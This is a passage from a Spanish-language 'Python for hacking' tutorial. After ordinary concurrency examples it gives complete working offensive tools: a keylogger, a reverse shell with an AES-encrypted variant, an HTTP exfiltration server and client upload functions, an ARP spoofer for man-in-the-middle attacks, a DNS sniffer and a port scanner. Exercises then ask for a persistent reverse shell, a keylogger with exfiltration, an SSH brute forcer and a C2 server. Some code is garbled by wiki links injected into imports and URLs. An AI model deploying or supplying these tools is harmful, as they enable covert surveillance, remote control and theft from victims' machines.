def shared_memory_example():
    counter = mp.Value("i", 0)
    data = mp.Array("d", [0.0] * 10)
    
    def increment(c, d):
        for _ in range(100):
            with c.get_lock():
                c.value += 1
            for i in range(len(d)):
                d[i] += 1.0
    
    processes = [mp.Process(target=increment, args=(counter, data)) for _ in range(4)]
    for p in processes: p.start()
    for p in processes: p.join()
    print("Counter:", counter.value)
`

### 12.4. asyncio

`````python
import asyncio
import aiohttp

async def fetch_url(session, url):
    async with session.get(url) as response:
        return await response.text()

async def fetch_all(urls):
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, url) for url in urls]
        results = await asyncio.gather(*tasks)
        return results

# asyncio TCP server
async def handle_client(reader, writer):
    data = await reader.read(100)
    message = data.decode()
    addr = writer.get_extra_info("peername")
    print("Recibido %s de %s" % (message, addr))
    writer.write(b"OK\n")
    await writer.drain()
    writer.close()

async def run_tcp_server(host="0.0.0.0", port=8888):
    server = await asyncio.start_server(handle_client, host, port)
    async with server:
        await server.serve_forever()

# asyncio con timeout
async def fetch_with_timeout(url, timeout=5):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                return await resp.text()
        except asyncio.TimeoutError:
            return "Timeout"

# asyncio + subprocess
async def run_subprocess(cmd):
    proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await proc.communicate()
    return stdout.decode(), stderr.decode()

# main
# asyncio.run(fetch_all(["https://example.com", "https://httpbin.org/get"]))
`

### 12.5. concurrent.futures

`````python
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed, wait
import time

def task(n):
    time.sleep(1)
    return n * 2

# ThreadPool
with ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(task, i) for i in range(10)]
    for f in as_completed(futures):
        print("Result:", f.result())

# ProcessPool
with ProcessPoolExecutor(max_workers=4) as executor:
    results = executor.map(task, range(10))
    for r in results:
        print("Process result:", r)

# Wait for all
with ThreadPoolExecutor(max_workers=3) as executor:
    futures = [executor.submit(task, i) for i in range(5)]
    done, not_done = wait(futures, timeout=5)
    print("Completados: %d" % len(done))

# Callbacks
def on_complete(future):
    print("Callback: resultado = %d" % future.result())

with ThreadPoolExecutor(max_workers=2) as executor:
    future = executor.submit(task, 42)
    future.add_done_callback(on_complete)

---

## 13. Proyectos Completos

### 13.1. Port Scanner Avanzado

`````python
import socket
import threading
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedPortScanner:
    def __init__(self, target, timeout=1, max_workers=200):
        self.target = target
        self.timeout = timeout
        self.max_workers = max_workers
        self.open_ports = []
        self.closed_ports = []
        self.filtered_ports = []
        self.lock = threading.Lock()
    
    def scan_port(self, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            result = sock.connect_ex((self.target, port))
            if result == 0:
                with self.lock:
                    self.open_ports.append(port)
                return port, "open"
            elif result == 10061 or result == 111:
                with self.lock:
                    self.closed_ports.append(port)
                return port, "closed"
            else:
                with self.lock:
                    self.filtered_ports.append(port)
                return port, "filtered"
        except socket.gaierror:
            return port, "error"
        except:
            return port, "error"
        finally:
            sock.close()
    
    def scan(self, ports, service_detect=True):
        print("[*] Escaneando %s - %d puertos" % (self.target, len(ports)))
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(self.scan_port, p): p for p in ports}
            for i, f in enumerate(as_completed(futures)):
                port, status = f.result()
                if status == "open":
                    service = self.detect_service(port) if service_detect else ""
                    print("\r[+] Puerto %d/%d: %d OPEN %s" % (i+1, len(ports), port, service))
                sys.stdout.flush()
        
        elapsed = time.time() - start
        print("\n[*] Escaneo completado en %.2f segundos" % elapsed)
        print("[*] Puertos abiertos: %d" % len(self.open_ports))
        
        return {"open": self.open_ports, "closed": self.closed_ports, "filtered": self.filtered_ports}
    
    def detect_service(self, port):
        servicios = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
                     135:"RPC",139:"NetBIOS",143:"IMAP",389:"LDAP",443:"HTTPS",445:"SMB",
                     993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",2049:"NFS",
                     3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",
                     8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
        return servicios.get(port, "")
    
    def banner_grab(self, port, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.target, port))
            banner = sock.recv(1024).decode(errors="ignore").strip()
            sock.close()
            return banner
        except:
            return None
    
    def grab_banners(self, ports):
        banners = {}
        for port in ports:
            banner = self.banner_grab(port)
            if banner:
                banners[port] = banner
                print("  Banner %d: %s" % (port, banner[:80]))
        return banners
    
    def scan_top_ports(self, top=1000):
        if top <= 100:
            ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,2049,
                     3306,3389,5432,5900,6000,6379,7001,8000,8080,8443,8888,9000,10000,27017]
        else:
            ports = list(range(1, top + 1))
        return self.scan(ports)
`

### 13.2. Keylogger

`````python
import pythoncom
import pyHook
import logging
import os
import sys
import time
from datetime import datetime

class Keylogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.logging = False
        self.buffer = ""
        self.last_save = time.time()
    
    def on_keyboard_event(self, event):
        if not self.logging:
            return True
        
        key = event.Key
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if len(key) == 1:
            self.buffer += key
        elif key == "Space":
            self.buffer += " "
        elif key == "Return":
            self.buffer += "\n"
        elif key == "Tab":
            self.buffer += "\t"
        elif key.startswith("Lshift") or key.startswith("Rshift") or key.startswith("Control") or key.startswith("Menu") or key.startswith("Capital"):
            pass  # Modifier keys
        elif key.startswith("Num"):
            pass
        else:
            self.buffer += "[%s]" % key
        
        # Save every 10 seconds
        if time.time() - self.last_save > 10:
            self.save()
            self.last_save = time.time()
        
        return True
    
    def save(self):
        if self.buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write("[%s] %s" % (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.buffer))
            self.buffer = ""
    
    def start(self):
        self.logging = True
        hm = pyHook.HookManager()
        hm.KeyDown = self.on_keyboard_event
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    
    def stop(self):
        self.logging = False
        self.save()

# Keylogger simple (cross-platform)
class SimpleKeylogger:
    def __init__(self, log_file="keys.log"):
        self.log_file = log_file
        self.running = False
    
    def start(self):
        # Linux: usar /dev/input/event*
        # Windows: usar msvcrt.getch
        # Esta es una version simplificada
        if sys.platform == "win32":
            import msvcrt
            self.running = True
            with open(self.log_file, "a") as f:
                while self.running:
                    if msvcrt.kbhit():
                        key = msvcrt.getch()
                        f.write(key.decode("utf-8", errors="ignore"))
                        f.flush()
    
    def stop(self):
        self.running = False
`

### 13.3. [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) Completa

`````python
import socket
import subprocess
import os
import sys
import threading
import time
import signal

class ReverseShell:
    def __init__(self):
        self.sock = None
        self.connected = False
    
    def connect(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        self.connected = True
        
        # Probar varios shells
        shells = ["/bin/bash", "/bin/sh", "/bin/zsh", "cmd.exe", "powershell.exe"]
        
        if sys.platform == "win32":
            shell = "cmd.exe"
        else:
            for s in shells:
                if os.path.exists(s):
                    shell = s
                    break
        
        proc = subprocess.Popen([shell], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Threads para IO
        t1 = threading.Thread(target=self.forward, args=(self.sock, proc.stdin))
        t2 = threading.Thread(target=self.forward, args=(proc.stdout, self.sock))
        t3 = threading.Thread(target=self.forward, args=(proc.stderr, self.sock))
        t1.daemon = True
        t2.daemon = True
        t3.daemon = True
        t1.start()
        t2.start()
        t3.start()
        
        try:
            while self.connected:
                time.sleep(1)
        except KeyboardInterrupt:
            self.close()
    
    def forward(self, src, dst):
        while self.connected:
            try:
                data = src.read(1024)
                if data:
                    if hasattr(dst, "write"):
                        dst.write(data)
                        dst.flush()
                    else:
                        dst.send(data)
                else:
                    break
            except:
                break
    
    def close(self):
        self.connected = False
        if self.sock:
            self.sock.close()

# Encrypted Reverse Shell
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

class EncryptedReverseShell:
    def __init__(self, key):
        self.key = key
        self.sock = None
    
    def encrypt(self, data):
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(self.pad(data))
        return base64.b64encode(iv + ct)
    
    def decrypt(self, data):
        raw = base64.b64decode(data)
        iv = raw[:16]
        ct = raw[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        pt = self.unpad(cipher.decrypt(ct))
        return pt.decode()
    
    def pad(self, data):
        while len(data) % 16 != 0:
            data += b" "
        return data
    
    def unpad(self, data):
        return data.rstrip(b" ")
`

### 13.4. HTTP Server para Exfiltracion

`````python
import [http](../raw/r3d3s-f0nd4m3nt0s.md#http).server
import socketserver
import os
import json
import urllib.parse
from datetime import datetime

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    upload_dir = "uploads"
    
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        content_type = self.headers.get("Content-Type", "")
        
        if "multipart/form-data" in content_type:
            # File upload
            self.handle_file_upload(body)
        elif "application/json" in content_type:
            # JSON data exfiltration
            data = json.loads(body.decode())
            self.log_data(data)
        elif "application/x-www-form-urlencoded" in content_type:
            # Form data
            data = urllib.parse.parse_qs(body.decode())
            self.log_data(data)
        else:
            # Raw data
            self.save_raw(body)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_GET(self):
        # Track request
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if params:
            self.log_data({"query": self.path, "params": params, "from": self.client_address[0]})
        
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>Server OK</h1>")
    
    def handle_file_upload(self, body):
        os.makedirs(self.upload_dir, exist_ok=True)
        filename = "upload_%s" % datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.upload_dir, filename)
        with open(filepath, "wb") as f:
            f.write(body)
        print("[+] Archivo recibido: %s (%d bytes)" % (filepath, len(body)))
    
    def log_data(self, data):
        os.makedirs(self.upload_dir, exist_ok=True)
        logfile = os.path.join(self.upload_dir, "exfil.json")
        entry = {"timestamp": datetime.now().isoformat(), "from": self.client_address[0], "data": data}
        with open(logfile, "a") as f:
            f.write(json.dumps(entry) + "\n")
        print("[+] Datos recibidos: %s" % str(data)[:200])
    
    def save_raw(self, data):
        os.makedirs(self.upload_dir, exist_ok=True)
        filename = "raw_%s.bin" % datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.upload_dir, filename)
        with open(filepath, "wb") as f:
            f.write(data)
        print("[+] Datos raw guardados: %s (%d bytes)" % (filepath, len(data)))

class ExfilServer:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.server = None
    
    def start(self):
        os.makedirs("uploads", exist_ok=True)
        self.server = socketserver.TCPServer((self.host, self.port), ExfilHandler)
        print("[*] Servidor de exfiltracion en http://%s:%d" % (self.host, self.port))
        self.server.serve_forever()
    
    def stop(self):
        if self.server:
            self.server.shutdown()

# Cliente de exfiltracion
def exfiltrate_file(url, filepath):
    import requests
    with open(filepath, "rb") as f:
        files = {"file": f}
        resp = requests.post(url, files=files)
        return resp.status_code == 200

def exfiltrate_json(url, data):
    import requests
    resp = requests.post(url, json=data)
    return resp.status_code == 200

def exfiltrate_b64(url, filepath):
    import requests
    import base64
    with open(filepath, "rb") as f:
        encoded = base64.b64encode(f.read()).decode()
        resp = requests.post(url, json={"filename": filepath.split("/")[-1], "data": encoded})
        return resp.status_code == 200
`

### 13.5. [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) Spoofer

`````python
from scapy.all import *
import time
import sys
import os

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, iface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface or conf.iface
        self.running = False
        self.our_mac = get_if_hwaddr(self.iface)
        self.target_mac = None
        self.gateway_mac = None
    
    def get_mac(self, ip):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        resp = srp1(pkt, timeout=3, verbose=0)
        return resp[Ether].src if resp else None
    
    def enable_ip_forward(self):
        if sys.platform.startswith("linux"):
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print("[+] IP forwarding activado")
    
    def disable_ip_forward(self):
        if sys.platform.startswith("linux"):
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
    
    def spoof(self):
        pkt1 = Ether(dst=self.target_mac) / ARP(
            op=2, pdst=self.target_ip, psrc=self.gateway_ip,
            hwdst=self.target_mac, hwsrc=self.our_mac)
        pkt2 = Ether(dst=self.gateway_mac) / ARP(
            op=2, pdst=self.gateway_ip, psrc=self.target_ip,
            hwdst=self.gateway_mac, hwsrc=self.our_mac)
        sendp(pkt1, verbose=0)
        sendp(pkt2, verbose=0)
    
    def restore(self):
        if self.target_mac and self.gateway_mac:
            pkt1 = Ether(dst=self.target_mac) / ARP(
                op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                hwdst=self.target_mac, hwsrc=self.gateway_mac)
            pkt2 = Ether(dst=self.gateway_mac) / ARP(
                op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                hwdst=self.gateway_mac, hwsrc=self.target_mac)
            for _ in range(5):
                sendp(pkt1, verbose=0)
                sendp(pkt2, verbose=0)
                time.sleep(0.1)
    
    def start(self, interval=2):
        self.enable_ip_forward()
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("[!] No se encontraron las MACs")
            return
        
        print("[+] Target MAC: %s" % self.target_mac)
        print("[+] Gateway MAC: %s" % self.gateway_mac)
        print("[+] Spoofeando... (Ctrl+C para detener)")
        
        self.running = True
        try:
            while self.running:
                self.spoof()
                time.sleep(interval)
        except KeyboardInterrupt:
            pass
        finally:
            self.restore()
            self.disable_ip_forward()
            print("\n[+] ARP restaurado")
    
    def stop(self):
        self.running = False
`

### 13.6. DNS Sniffer

`````python
from scapy.all import *
from collections import defaultdict
import datetime
import json

class DNSSniffer:
    def __init__(self, interface=None):
        self.interface = interface
        self.queries = defaultdict(int)
        self.responses = defaultdict(list)
        self.running = False
    
    def process_packet(self, packet):
        if packet.haslayer([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)):
            if packet[DNS].qr == 0:  # Query
                try:
                    qname = packet[DNS].qd.qname.decode()
                    self.queries[qname] += 1
                    src = packet[[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)].src
                    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                    print("[%s] Query: %s -> %s" % (timestamp, src, qname))
                except:
                    pass
            
            elif packet[DNS].qr == 1:  # Response
                try:
                    qname = packet[DNS].qd.qname.decode()
                    answers = []
                    for i in range(packet[DNS].ancount):
                        ans = packet[DNS].an[i]
                        if ans.type == 1:  # A record
                            answers.append(str(ans.rdata))
                        elif ans.type == 5:  # CNAME
                            answers.append(str(ans.rdata))
                    if answers:
                        self.responses[qname].extend(answers)
                        print("  Respuesta: %s -> %s" % (qname, ", ".join(answers)))
                except:
                    pass
    
    def start(self, count=0, timeout=0):
        self.running = True
        print("[*] DNS Sniffer iniciado (Ctrl+C para detener)")
        sniff(iface=self.interface, filter="[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) port 53",
              prn=self.process_packet, store=False,
              count=count, timeout=timeout)
    
    def report(self):
        print("\n=== REPORTE DNS ===")
        print("Consultas mas frecuentes:")
        for qname, count in sorted(self.queries.items(), key=lambda x: x[1], reverse=True)[:20]:
            print("  %s: %d veces" % (qname, count))
        
        print("Resoluciones:")
        for qname, [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) in self.responses.items():
            print("  %s -> %s" % (qname, ", ".join([set](../raw/ph1sh1ng.md#social-engineering-toolkit)(ips))))
    
    def save_json(self, filename="dns_report.json"):
        data = {"queries": dict(self.queries), "responses": {k: list(set(v)) for k, v in self.responses.items()}}
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)

---

## 14. Ejercicios Prácticos

### Ejercicio 1: Port Scanner
Crea un escaner de puertos que soporte SYN scan (con Scapy y raw sockets), connect scan, y que detecte el servicio por banner grab.

### Ejercicio 2: [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) Spoofer + Sniffer
Implementa un [mitm](../raw/m1tm-m0b1l3.md) completo: [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing) + [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) forwarding + sniffing de credenciales [http](../raw/r3d3s-f0nd4m3nt0s.md#http).

### Ejercicio 3: [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) con [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)
Crea una reverse shell que se reconecte automaticamente cada 5 segundos si pierde la conexion, y que soporte subir/descargar archivos.

### Ejercicio 4: Keylogger con exfiltracion
Implementa un keylogger que guarde las teclas localmente y las envie a un servidor HTTP cada 60 segundos.

### Ejercicio 5: [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Tunel
Usando Scapy, implementa un tunel DNS que pueda codificar datos en consultas DNS y decodificarlos en el server.

### Ejercicio 6: Analizador de [pe](../raw/w1n-1nt3rn4ls.md#pe)
Crea una herramienta que analice archivos PE, extraiga imports/exports, detecte packers por entropy, y descompile secciones con capstone.

### Ejercicio 7: [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) SSH
Usando paramiko, implementa un brute forcer SSH que soporte wordlists, threading, y deteccion de credenciales validas.

### Ejercicio 8: Servidor [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) basico
Implementa un C2 server con websockets que acepte conexiones de agentes, ejecute comandos, y maneje exfiltracion de archivos.

### Ejercicio 9: Web Scraper [osint](../raw/0s1nt.md)
Crea un scraper que dado un dominio, extraiga emails, subdominios, tecnologias (WhatWeb-like), y genere un reporte.

### Ejercicio 10: Cifrador de archivos
Implementa una herramienta que cifre archivos con [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-256-GCM, derive keys con PBKDF2, y maneje firmas [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa).

---

## 15. Recursos y Referencias

### Documentacion
- Scapy: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://scapy.readthedocs.io/
- Requests: https://docs.[python](../raw/pyth0n-f0r-h4ck1ng.md)-requests.org/
- Paramiko: [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://docs.paramiko.org/
- [cryptography](../raw/crypt0-f0r-h4ck3rs.md): https://[cryptography](../raw/crypt0-f0r-h4ck3rs.md).io/
- Capstone: https://www.capstone-engine.org/

### Libros
- Black Hat Python (Justin Seitz)
- Gray Hat Python (Justin Seitz)
- The Hacker Playbook 3 (Peter Kim)
- Violent Python (TJ O'Connor)

### Labs
- Hack The Box: https://[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)-h4ckth3b0x.md#[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)).[com](../raw/w1n-s9bsyst3ms.md#com)
- [tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme): https://[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme).com
- VulnHub: https://vulnhub.com
- PentesterLab: https://pentesterlab.com

### Cheatsheets
- Python for Hackers: Documentacion completa de modulos de [red](../raw/r3d3s-f0nd4m3nt0s.md)
- Scapy Cheatsheet: Construccion de paquetes, sniffing, ataques
- Socket Programming: [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) client/server, raw sockets
- Automation: SSH, FTP, SMTP automation patterns

